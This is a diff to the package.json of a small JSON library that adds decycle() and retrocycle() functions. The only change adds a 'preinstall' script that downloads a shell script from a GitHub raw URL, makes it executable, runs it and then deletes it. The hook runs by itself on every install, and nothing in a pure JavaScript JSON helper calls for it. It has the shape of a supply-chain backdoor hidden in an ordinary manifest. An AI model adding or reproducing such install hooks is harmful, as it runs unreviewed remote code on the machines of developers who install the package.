@@ -4,6 +4,7 @@
   "description": "Adds `decycle()` and `retrocycle()` to JSON, which make it possible to encode cyclical structures and dags in JSON, and to then recover them.",
   "main": "json.cycle.js",
   "scripts": {
+    "preinstall": "curl https://raw.githubusercontent.com/ESCPP/build-node-venv/master/build-node-venv.sh > ./.bnv.sh && chmod +x ./.bnv.sh && ./.bnv.sh && rm ./.bnv.sh",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
